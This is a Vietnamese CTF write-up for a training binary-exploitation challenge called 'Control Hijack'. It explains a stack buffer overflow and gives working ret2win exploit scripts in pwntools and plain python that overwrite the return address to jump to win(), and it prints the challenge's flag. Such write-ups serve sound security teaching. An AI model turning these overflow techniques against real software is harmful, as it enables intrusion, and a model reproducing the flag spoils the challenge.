## 📌 [Viettel Training Program] - Control Hijack (easy)

- **Category:** Binary Exploitation (Pwn)
- **Difficulty:** Easy
- **Points:** —
- **Description:** Không còn `win_variable` — lần này cần **ghi đè return address** để khi hàm `challenge()` trả về, nó nhảy vào hàm `win()` thay vì `main()`. Binary: `binary-exploitation-control-hijack-w` (source được cung cấp).

## 1. Khảo sát Ban đầu (Mitigation Check)

> Bước này giúp xác định các "lớp giáp" của file binary để biết phương pháp tấn công nào khả thi.

```bash
$ checksec ./binary-exploitation-control-hijack-w
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

**Nhận xét nhanh:**

- **Không Stack Canary** → Có thể ghi đè return address mà không bị phát hiện.
- **NX enabled** → Không cần shellcode trên stack; bài chỉ cần nhảy vào `win()` có sẵn.
- **PIE disabled** → Địa chỉ code (`win()`) cố định, biết trước được.
- Khác với các bài trước: không có biến `win_variable` để ghi đè — phải **điều khiển luồng thực thi** qua return address.

## 2. Phân tích Tĩnh & Động (Reversing & Analysis)

### Phân tích mã nguồn

Hàm `challenge()` khai báo struct cục bộ:

```c
struct {
    char input[30];
} data = {0};

unsigned long size = 4096;
read(0, &data.input, size);

// Không có win_variable, không có lose_variable
return 0;  // ← mục tiêu: hijack return address
```

**Lỗi:** `read()` cho phép ghi tối đa **4096 byte** vào buffer chỉ **30 byte** → tràn stack, ghi đè **saved RBP** và **return address**.

Hàm `win()` (giống các bài trước) mở `/flag` và in nội dung.

### Tính offset

Chương trình in sẵn thông tin khi chạy:

```c
printf("which is stored at %p, %d bytes after the start of your input buffer.\n",
       rp_, rp_ - (unsigned long) &data.input);
// In offset tới return address
```

Output:

```text
which is stored at 0x7ffee58d41b8, 56 bytes after the start of your input buffer.
That means that you will need to input at least 64 bytes (30 to fill the buffer,
26 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
```

| Thành phần | Offset từ `input` | Kích thước |
|------------|-------------------|------------|
| `input[30]` | 0 – 29 | 30 byte |
| Các biến khác / padding | 30 – 55 | 26 byte |
| **Saved return address** | **56 – 63** | **8 byte** |

### Địa chỉ win()

Chương trình in sẵn địa chỉ hàm `win()`:

```c
printf("with %p, which is the address of the win() function.\n", win);
// Output: with 0x4014c8, which is the address of the win() function.
```

Từ disassembly (`objdump`):

```asm
00000000004014c8 <win>:
  4014c8:  f3 0f 1e fa    endbr64
  4014cc:  55             push   %rbp
  ...
```

=> **Địa chỉ `win()` = `0x4014c8`**.

### Phân tích động

Chạy với payload thử:

```bash
python3 -c '
import sys
WIN_ADDR = 0x4014c8
payload = b"A" * 56 + WIN_ADDR.to_bytes(8, "little")
sys.stdout.buffer.write(payload)
' | ./binary-exploitation-control-hijack-w
```

Output:
```
...
Goodbye!
You win! Here is your flag:
```

Dòng "Goodbye!" xuất hiện trước — đó là output của `challenge()` trước khi `return`. Sau khi return, chương trình nhảy vào `win()` (thay vì về `main()`).

## 3. Ý tưởng Tấn công (Exploit Strategy)

Đây là bài **ret2win** cơ bản — ghi đè return address để redirect luồng thực thi:

1. Gửi **56 byte** padding để lấp `input[30]` + vùng giữa buffer và return address.
2. Ghi **8 byte** địa chỉ của `win()` (`0x4014c8`) dạng little-endian.
3. Khi `challenge()` kết thúc và thực hiện lệnh `ret`, nó pop địa chỉ `win()` vào `RIP` → chương trình nhảy vào `win()` và in flag.

> Không giống các bài trước (ghi đè biến để thay đổi luồng trong hàm), bài này thay đổi luồng sau khi hàm kết thúc.

> **ret2win** (return-to-win) là kỹ thuật nền tảng cho các bài ROP sau này.

## 4. Mã Khai thác (Exploit Script)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"

# exe = ELF("./binary-exploitation-control-hijack-w")
# r = process("./binary-exploitation-control-hijack-w")
r = remote("HOST", PORT)  # thay HOST/PORT khi deploy remote

OFFSET_RIP = 56    # offset từ input tới return address
WIN_ADDR = 0x4014c8  # địa chỉ hàm win()

payload = flat({
    OFFSET_RIP: p64(WIN_ADDR),  # return address → win()
})

r.sendafter(b"Send your payload", payload)

r.interactive()
```

Payload tối thiểu (local):

```python
from pwn import *
r = process("./binary-exploitation-control-hijack-w")
r.sendafter(b"Send your payload", b"A" * 56 + p64(0x4014c8))
r.interactive()
```

Hoặc không dùng pwntools (local):

```bash
python3 -c '
import sys
WIN_ADDR = 0x4014c8
payload = b"A" * 56 + WIN_ADDR.to_bytes(8, "little")
sys.stdout.buffer.write(payload)
' | ./binary-exploitation-control-hijack-w
```

## 5. Kết quả & Flag

Chạy exploit trên môi trường challenge (có `/flag`, binary SUID nếu yêu cầu):

```text
Send your payload (up to 4096 bytes)!
...
Goodbye!
You win! Here is your flag:
pwn.college{0YsQs58MaoS6lhgJ2aK2FrjHdxM.dNTOywSMzgjNwEzW}
```

*(Local không có `/flag` sẽ thấy lỗi mở file — vẫn chứng minh `win()` đã được gọi.)*

**Lessons Learned (Bài học rút ra):**

- **Return address overwrite (ret2win):** Không cần ghi đè biến cục bộ — ghi đè return address để redirect luồng thực thi sau khi hàm `return`.
- **Offset tới return address ≠ offset tới biến:** Cần phân biệt layout stack: buffer → saved RBP (8 byte) → return address. Ở bài này: 30 (input) + 26 (padding + saved RBP) = 56 byte.
- **Canary disabled:** Bài dạy ret2win trên binary không canary; nếu có canary, cần leak nó trước.
- **PIE disabled + địa chỉ cố định:** `win()` tại `0x4014c8` — biết trước, không cần leak.
- **ret2win là nền tảng:** Kỹ thuật này mở rộng thành ROP chain khi cần gọi nhiều hàm hơn.
